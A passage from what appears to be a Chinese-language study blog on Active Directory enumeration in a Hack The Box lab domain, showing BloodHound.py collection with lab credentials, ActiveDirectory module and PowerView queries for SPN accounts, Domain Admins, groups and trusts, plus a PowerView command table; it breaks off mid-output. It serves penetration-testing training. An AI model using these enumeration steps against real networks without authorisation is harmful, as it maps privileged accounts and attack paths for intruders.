<h2 id="6-BloodHound-py"><a href="#6-BloodHound-py" class="headerlink" title="6. BloodHound.py"></a>6. BloodHound.py</h2><h3 id="执行-BloodHound-py"><a href="#执行-BloodHound-py" class="headerlink" title="执行 BloodHound.py"></a>执行 BloodHound.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo bloodhound-python -u <span class="hljs-string">&#x27;forend&#x27;</span> -p <span class="hljs-string">&#x27;Klmcargo2&#x27;</span> -ns 172.16.5.5 -d inlanefreight.local -c all <br><br>INFO: Found AD domain: inlanefreight.local<br>INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>INFO: Found 1 domains<br>INFO: Found 2 domains <span class="hljs-keyword">in</span> the forest<br>INFO: Found 564 computers<br>INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>INFO: Found 2951 <span class="hljs-built_in">users</span><br>INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>INFO: Found 183 <span class="hljs-built_in">groups</span><br>INFO: Found 2 trusts<br>INFO: Starting computer enumeration with 10 workers<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="7-ActiveDirectory-PowerShell-模块"><a href="#7-ActiveDirectory-PowerShell-模块" class="headerlink" title="7. ActiveDirectory PowerShell 模块"></a>7. ActiveDirectory PowerShell 模块</h2><h3 id="发现模块"><a href="#发现模块" class="headerlink" title="发现模块"></a>发现模块</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-Module</span><br><br>ModuleType Version    Name                                ExportedCommands<br><span class="hljs-literal">----------</span> <span class="hljs-literal">-------</span>    <span class="hljs-literal">----</span>                                <span class="hljs-literal">----------------</span><br>Manifest   <span class="hljs-number">3.1</span>.<span class="hljs-number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="hljs-built_in">Add-Member</span>, <span class="hljs-built_in">Add-Type</span>, <span class="hljs-built_in">Clear-Variable</span>, <span class="hljs-built_in">Compare-Object</span>...&#125;<br>Script     <span class="hljs-number">2.0</span>.<span class="hljs-number">0</span>      PSReadline                          &#123;<span class="hljs-built_in">Get-PSReadLineKeyHandler</span>, <span class="hljs-built_in">Get-PSReadLineOption</span>, <span class="hljs-built_in">Remove-PS</span>...<br></code></pre></td></tr></table></figure>

<h3 id="加载-ActiveDirectory-模块"><a href="#加载-ActiveDirectory-模块" class="headerlink" title="加载 ActiveDirectory 模块"></a>加载 ActiveDirectory 模块</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Import-Module</span> ActiveDirectory<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-Module</span><br><br>ModuleType Version    Name                                ExportedCommands<br><span class="hljs-literal">----------</span> <span class="hljs-literal">-------</span>    <span class="hljs-literal">----</span>                                <span class="hljs-literal">----------------</span><br>Manifest   <span class="hljs-number">1.0</span>.<span class="hljs-number">1.0</span>    ActiveDirectory                     &#123;<span class="hljs-built_in">Add-ADCentralAccessPolicyMember</span>, <span class="hljs-built_in">Add-ADComputerServiceAcc</span>...<br>Manifest   <span class="hljs-number">3.1</span>.<span class="hljs-number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="hljs-built_in">Add-Member</span>, <span class="hljs-built_in">Add-Type</span>, <span class="hljs-built_in">Clear-Variable</span>, <span class="hljs-built_in">Compare-Object</span>...&#125;<br>Script     <span class="hljs-number">2.0</span>.<span class="hljs-number">0</span>      PSReadline                          &#123;<span class="hljs-built_in">Get-PSReadLineKeyHandler</span>, <span class="hljs-built_in">Get-PSReadLineOption</span>, <span class="hljs-built_in">Remove-PS</span>...<br></code></pre></td></tr></table></figure>

<h3 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADDomain</span><br><br>AllowedDNSSuffixes                 : &#123;&#125;<br>ChildDomains                       : &#123;LOGISTICS.INLANEFREIGHT.LOCAL&#125;<br>ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL<br>DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL<br>DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL<br>DNSRoot                            : INLANEFREIGHT.LOCAL<br>DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL<br>DomainMode                         : Windows2016Domain<br>DomainSID                          : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114</span><br>ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL<br>Forest                             : INLANEFREIGHT.LOCAL<br>InfrastructureMaster               : ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL<br>LastLogonReplicationInterval       :<br>LinkedGroupPolicyObjects           : &#123;cn=&#123;DDBB8574<span class="hljs-literal">-E94E-4525-8C9D-ABABE31223D0</span>&#125;,cn=policies,cn=system,DC=INLANEFREIGHT,<br>                                     DC=LOCAL, CN=&#123;<span class="hljs-number">31</span>B2F340<span class="hljs-literal">-016D-11D2-945F-00C04FB984F9</span>&#125;,CN=Policies,CN=System,DC=INLAN<br>                                     EFREIGHT,DC=LOCAL&#125;<br>LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL<br>ManagedBy                          :<br>Name                               : INLANEFREIGHT<br>NetBIOSName                        : INLANEFREIGHT<br>ObjectClass                        : domainDNS<br>ObjectGUID                         : <span class="hljs-number">71</span>e4ecd1<span class="hljs-literal">-a9f6-4f55-8a0b-e8c398fb547a</span><br>ParentDomain                       :<br>PDCEmulator                        : ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL<br>PublicKeyRequiredPasswordRolling   : True<br>QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL<br>ReadOnlyReplicaDirectoryServers    : &#123;&#125;<br>ReplicaDirectoryServers            : &#123;ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL&#125;<br>RIDMaster                          : ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL<br>SubordinateReferences              : &#123;DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,<br>                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,<br>                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,<br>                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL&#125;<br>SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL<br>UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL<br></code></pre></td></tr></table></figure>

<h3 id="Get-ADUser"><a href="#Get-ADUser" class="headerlink" title="Get-ADUser"></a>Get-ADUser</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> &#123;ServicePrincipalName <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;<span class="hljs-variable">$null</span>&quot;</span>&#125; <span class="hljs-literal">-Properties</span> ServicePrincipalName<br><br>DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>Enabled              : True<br>GivenName            : Sharepoint<br>Name                 : adfs<br>ObjectClass          : user<br>ObjectGUID           : <span class="hljs-number">49</span>b53bea<span class="hljs-literal">-4bc4-4a68-b694-b806d9809e95</span><br>SamAccountName       : adfs<br>ServicePrincipalName : &#123;adfsconnect/azure01.inlanefreight.local&#125;<br>SID                  : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5244</span><br>Surname              : Admin<br>UserPrincipalName    :<br><br>DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>Enabled              : True<br>GivenName            : Jessica<br>Name                 : BACKUPAGENT<br>ObjectClass          : user<br>ObjectGUID           : <span class="hljs-number">2</span>ec53e98<span class="hljs-literal">-3a64-4706-be23-1d824ff61bed</span><br>SamAccountName       : backupagent<br>ServicePrincipalName : &#123;backupjob/veam001.inlanefreight.local&#125;<br>SID                  : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5220</span><br>Surname              : Systemmailbox <span class="hljs-number">8</span>Cc370d3<span class="hljs-literal">-822A-4Ab8-A926-Bb94bd0641a9</span><br>UserPrincipalName    :<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="检查信任关系"><a href="#检查信任关系" class="headerlink" title="检查信任关系"></a>检查信任关系</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADTrust</span> <span class="hljs-literal">-Filter</span> *<br><br>Direction               : BiDirectional<br>DisallowTransivity      : False<br>DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL<br>ForestTransitive        : False<br>IntraForest             : True<br>IsTreeParent            : False<br>IsTreeRoot              : False<br>Name                    : LOGISTICS.INLANEFREIGHT.LOCAL<br>ObjectClass             : trustedDomain<br>ObjectGUID              : f48a1169<span class="hljs-literal">-2e58-42c1-ba32-a6ccb10057ec</span><br>SelectiveAuthentication : False<br>SIDFilteringForestAware : False<br>SIDFilteringQuarantined : False<br>Source                  : DC=INLANEFREIGHT,DC=LOCAL<br>Target                  : LOGISTICS.INLANEFREIGHT.LOCAL<br>TGTDelegation           : False<br>TrustAttributes         : <span class="hljs-number">32</span><br>TrustedPolicy           :<br>TrustingPolicy          :<br>TrustType               : Uplevel<br>UplevelOnly             : False<br>UsesAESKeys             : False<br>UsesRC4Encryption       : False<br><br>Direction               : BiDirectional<br>DisallowTransivity      : False<br>DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL<br>ForestTransitive        : True<br>IntraForest             : False<br>IsTreeParent            : False<br>IsTreeRoot              : False<br>Name                    : FREIGHTLOGISTICS.LOCAL<br>ObjectClass             : trustedDomain<br>ObjectGUID              : <span class="hljs-number">1597717</span>f<span class="hljs-literal">-89b7-49b8-9cd9-0801d52475ca</span><br>SelectiveAuthentication : False<br>SIDFilteringForestAware : False<br>SIDFilteringQuarantined : False<br>Source                  : DC=INLANEFREIGHT,DC=LOCAL<br>Target                  : FREIGHTLOGISTICS.LOCAL<br>TGTDelegation           : False<br>TrustAttributes         : <span class="hljs-number">8</span><br>TrustedPolicy           :<br>TrustingPolicy          :<br>TrustType               : Uplevel<br>UplevelOnly             : False<br>UsesAESKeys             : False<br>UsesRC4Encryption       : False  <br></code></pre></td></tr></table></figure>

<h3 id="组枚举"><a href="#组枚举" class="headerlink" title="组枚举"></a>组枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADGroup</span> <span class="hljs-literal">-Filter</span> * | <span class="hljs-built_in">select</span> name<br><br>name<br><span class="hljs-literal">----</span><br>Administrators<br>Users<br>Guests<br>Print Operators<br>Backup Operators<br>Replicator<br>Remote Desktop Users<br>Network Configuration Operators<br>Performance Monitor Users<br>Performance Log Users<br>Distributed COM Users<br>IIS_IUSRS<br>Cryptographic Operators<br>Event Log Readers<br>Certificate Service DCOM Access<br>RDS Remote Access Servers<br>RDS Endpoint Servers<br>RDS Management Servers<br>Hyper<span class="hljs-literal">-V</span> Administrators<br>Access Control Assistance Operators<br>Remote Management Users<br>Storage Replica Administrators<br>Domain Computers<br>Domain Controllers<br>Schema Admins<br>Enterprise Admins<br>Cert Publishers<br>Domain Admins<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="详细组信息"><a href="#详细组信息" class="headerlink" title="详细组信息"></a>详细组信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADGroup</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Backup Operators&quot;</span><br><br>DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL<br>GroupCategory     : Security<br>GroupScope        : DomainLocal<br>Name              : Backup Operators<br>ObjectClass       : <span class="hljs-built_in">group</span><br>ObjectGUID        : <span class="hljs-number">6276</span>d85d<span class="hljs-literal">-9c39-4b7c-8449-cad37e8abc38</span><br>SamAccountName    : Backup Operators<br>SID               : S<span class="hljs-literal">-1-5-32-551</span><br></code></pre></td></tr></table></figure>

<h3 id="组成员身份"><a href="#组成员身份" class="headerlink" title="组成员身份"></a>组成员身份</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Backup Operators&quot;</span><br><br>distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>name              : BACKUPAGENT<br>objectClass       : user<br>objectGUID        : <span class="hljs-number">2</span>ec53e98<span class="hljs-literal">-3a64-4706-be23-1d824ff61bed</span><br>SamAccountName    : backupagent<br>SID               : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5220</span><br></code></pre></td></tr></table></figure>

<h2 id="8-PowerView"><a href="#8-PowerView" class="headerlink" title="8. PowerView"></a>8. PowerView</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>Export-PowerViewCSV</code></td>
<td>将结果追加到 CSV 文件</td>
</tr>
<tr>
<td><code>ConvertTo-SID</code></td>
<td>将用户或组名转换为其 SID 值</td>
</tr>
<tr>
<td><code>Get-DomainSPNTicket</code></td>
<td>请求指定服务主体名称（SPN）账户的 Kerberos 票据</td>
</tr>
<tr>
<td><strong>域&#x2F;LDAP 功能：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-Domain</code></td>
<td>将返回当前（或指定）域的 AD 对象</td>
</tr>
<tr>
<td><code>Get-DomainController</code></td>
<td>返回指定域的域控制器列表</td>
</tr>
<tr>
<td><code>Get-DomainUser</code></td>
<td>将返回所有用户或 AD 中的特定用户对象</td>
</tr>
<tr>
<td><code>Get-DomainComputer</code></td>
<td>将返回 AD 中的所有计算机或特定计算机对象</td>
</tr>
<tr>
<td><code>Get-DomainGroup</code></td>
<td>将返回 AD 中的所有组或特定组对象</td>
</tr>
<tr>
<td><code>Get-DomainOU</code></td>
<td>在 AD 中搜索所有或特定 OU 对象</td>
</tr>
<tr>
<td><code>Find-InterestingDomainAcl</code></td>
<td>查找域中对象 ACL，其修改权限设置为非内置对象</td>
</tr>
<tr>
<td><code>Get-DomainGroupMember</code></td>
<td>将返回特定域组的成员</td>
</tr>
<tr>
<td><code>Get-DomainFileServer</code></td>
<td>返回可能作为文件服务器运行的服务器列表</td>
</tr>
<tr>
<td><code>Get-DomainDFSShare</code></td>
<td>返回当前（或指定）域中所有分布式文件系统的列表</td>
</tr>
<tr>
<td><strong>GPO 功能：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-DomainGPO</code></td>
<td>将返回所有 GPO 或 AD 中的特定 GPO 对象</td>
</tr>
<tr>
<td><code>Get-DomainPolicy</code></td>
<td>返回当前域的默认域策略或域控制器策略</td>
</tr>
<tr>
<td><strong>计算机枚举函数：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-NetLocalGroup</code></td>
<td>枚举本地或远程机器上的本地组</td>
</tr>
<tr>
<td><code>Get-NetLocalGroupMember</code></td>
<td>枚举特定本地组的成员</td>
</tr>
<tr>
<td><code>Get-NetShare</code></td>
<td>返回本地（或远程）计算机上的开放共享</td>
</tr>
<tr>
<td><code>Get-NetSession</code></td>
<td>将返回本地（或远程）计算机的会话信息</td>
</tr>
<tr>
<td><code>Test-AdminAccess</code></td>
<td>测试当前用户是否具有对本地（或远程）计算机的管理员访问权限</td>
</tr>
<tr>
<td><strong>线程化“元”函数：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Find-DomainUserLocation</code></td>
<td>查找特定用户登录的机器</td>
</tr>
<tr>
<td><code>Find-DomainShare</code></td>
<td>查找域内机器的可访问共享</td>
</tr>
<tr>
<td><code>Find-InterestingDomainShareFile</code></td>
<td>在域内可读共享中搜索符合特定条件的文件</td>
</tr>
<tr>
<td><code>Find-LocalAdminAccess</code></td>
<td>查找当前用户在本地域中具有本地管理员访问权限的机器</td>
</tr>
<tr>
<td><strong>域信任功能：</strong></td>
<td></td>
</tr>
<tr>
<td><code>Get-DomainTrust</code></td>
<td>返回当前域或指定域的域信任关系</td>
</tr>
<tr>
<td><code>Get-ForestTrust</code></td>
<td>返回当前林或指定林的所有林信任</td>
</tr>
<tr>
<td><code>Get-DomainForeignUser</code></td>
<td>枚举位于用户域之外组中的用户</td>
</tr>
<tr>
<td><code>Get-DomainForeignGroupMember</code></td>
<td>枚举包含非组所在域用户的组，并返回每个外部成员</td>
</tr>
<tr>
<td><code>Get-DomainTrustMapping</code></td>
<td>将枚举当前域及其可见的所有其他域的所有信任关系。</td>
</tr>
</tbody></table>
<h3 id="域用户信息"><a href="#域用户信息" class="headerlink" title="域用户信息"></a>域用户信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> mmorgan <span class="hljs-literal">-Domain</span> inlanefreight.local | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-Property</span> name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol<br><br>name                 : Matthew Morgan<br>samaccountname       : mmorgan<br>description          :<br>memberof             : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar<br>                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security<br>                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="hljs-built_in">H</span> Drive,OU=Security<br>                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...&#125;<br>whencreated          : <span class="hljs-number">10</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span> <span class="hljs-number">5</span>:<span class="hljs-number">37</span>:<span class="hljs-number">06</span> PM<br>pwdlastset           : <span class="hljs-number">11</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2021</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">57</span> AM<br>lastlogontimestamp   : <span class="hljs-number">2</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">34</span>:<span class="hljs-number">25</span> PM<br>accountexpires       : NEVER<br>admincount           : <span class="hljs-number">1</span><br>userprincipalname    : mmorgan@inlanefreight.local<br>serviceprincipalname :<br>mail                 :<br>useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH<br></code></pre></td></tr></table></figure>

<h3 id="递归组成员身份"><a href="#递归组成员身份" class="headerlink" title="递归组成员身份"></a>递归组成员身份</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt;  <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-Recurse</span><br><br>GroupDomain             : INLANEFREIGHT.LOCAL<br>GroupName               : Domain Admins<br>GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL<br>MemberDomain            : INLANEFREIGHT.LOCAL<br>MemberName              : svc_qualys<br>MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>MemberObjectClass       : user<br>MemberSID               : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5613</span><br><br>GroupDomain             : INLANEFREIGHT.LOCAL<br>GroupName               : Domain Admins<br>GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL<br>MemberDomain            : INLANEFREIGHT.LOCAL<br>MemberName              : <span class="hljs-built_in">sp</span><span class="hljs-literal">-admin</span><br>MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>MemberObjectClass       : user<br>MemberSID               : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5228</span><br><br>GroupDomain             : INLANEFREIGHT.LOCAL<br>GroupName               : Secadmins<br>GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>MemberDomain            : INLANEFREIGHT.LOCAL<br>MemberName              : spong1990<br>MemberDistinguishedName : CN=Maggie<br>                          Jablonski,OU=Operations,OU=Logistics<span class="hljs-literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>MemberObjectClass       : user<br>MemberSID               : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1965</span><br><br>&lt;SNIP&gt;  <br></code></pre></td></tr></table></figure>

<h3 id="信任枚举"><a href="#信任枚举" class="headerlink" title="信任枚举"></a>信任枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainTrustMapping</span><br><br>SourceName      : INLANEFREIGHT.LOCAL<br>TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL<br>TrustType       : WINDOWS_ACTIVE_DIRECTORY<br>TrustAttributes : WITHIN_FOREST<br>TrustDirection  : Bidirectional<br>WhenCreated     : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">6</span>:<span class="hljs-number">20</span>:<span class="hljs-number">22</span> PM<br>WhenChanged     : <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">55</span>:<span class="hljs-number">55</span> PM<br><br>SourceName      : INLANEFREIGHT.LOCAL<br>TargetName      : FREIGHTLOGISTICS.LOCAL<br>TrustType       : WINDOWS_ACTIVE_DIRECTORY<br>TrustAttributes : FOREST_TRANSITIVE<br>TrustDirection  : Bidirectional<br>WhenCreated     : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">8</span>:<span class="hljs-number">07</span>:<span 